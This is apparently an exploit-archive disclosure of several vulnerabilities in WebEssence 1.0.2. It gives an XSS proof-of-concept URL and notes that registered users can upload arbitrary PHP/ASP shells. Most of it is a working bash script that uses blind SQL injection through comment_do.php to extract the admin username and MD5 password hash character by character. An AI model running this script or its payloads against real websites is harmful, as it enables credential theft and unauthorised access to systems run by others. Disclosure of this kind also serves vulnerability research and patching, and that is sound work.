#
# WebEssence 1.0.2 Multiple Vulnerabilities
#
# Bugs found by white_sheep, r00t and epicfail
# for Debug|Track session @ Backtrack|italia community conference
# www.backtrack.it
# 
# # # # # # # # # XSS # # # # # # # # # # # # 
# PoC:
# http://localhost/webessence/webessence/oembed.php?url=http://google.com&id=<script>alert('Backtrack|it');</script>
# In "url" variable is possible to inject a remote HTML page
# 
# # # # # # Remote Shell Uplaod # # # # # # # 
# PoC: (thanks to emgent)
# Unprivileged registered user can upload any PHP or ASP file that can be found in "uploads/other/"
#
# # # # # Remote Blind Sql Injection # # # # #

#!/bin/bash

query1="1/**/AND/**/CHAR("
query2=")=(SELECT/**/SUBSTRING(name,"
query3=",1)/**/FROM/**/users)"
url=$1
path=$2

if [ "$1" == "" || "$2" == ""  ]
then
	echo "Usage: $0 [url] [path]"
	echo "Example: $0 http://localhost /webessence"
	exit
fi

good=0
position=1

#SEARCH USERNAME
echo -n "Username: "
while [ $good -lt 1 ]
do
	found="false"
	for name in `seq 97 122`
	do
		NOW=`curl -s -d "name=Ph33r&url=&email=&comment=Ph33r&itemid=$query1$name$query2$position$query3" -H "Referer: $url$path" -H "Content-Type: application/x-www-form-urlencoded" $url$path/comment_do.php`
		if [ "$NOW" == ""  ]
		then
			let position+=1
			found="true"
			perl -e "printf '%c', $name;"
			continue
		fi

	done
	if [ "$found" == "false" ]
	then
		good=1
	fi
done

good=0
position=1
query2=")=(SELECT/**/SUBSTRING(pwd,"
pwd_chr="48 49 50 51 52 53 54 55 56 57 97 98 99 100 101 102"

#SEARCH PASSWORD
echo ""
echo -n "MD5 Pass: "                                                                                                                                         
while [ $good -lt 1 ]                                                                                                                                        
do                                                                                                                                                           
        found="false"                                                                                                                                        
        for pwd in $pwd_chr                                                                                                                             
        do                                                                                                                                                   
                NOW=`curl -s -d "name=Ph33r&url=&email=&comment=Ph33r&itemid=$query1$pwd$query2$position$query3" -H "Referer: $url$path" -H "Content-Type: application/x-www-form-urlencoded" $url$path/comment_do.php`                                                                                                  
		if [ "$NOW" == ""  ]                                                                                                                         
                then                                                                                                                                         
                        let position+=1                                                                                                                      
                        found="true"                                                                                                                         
                        perl -e "printf '%c', $pwd;"
                        continue                                                                                                                             
                fi                                                                                                                                           
                                                                                                                                                             
        done                                                                                                                                                 
        if [ "$found" == "false" ]                                                                                                                           
        then                                                                                                                                                 
                good=1                                                                                                                                       
        fi                                                                                                                                                   
done
echo ""
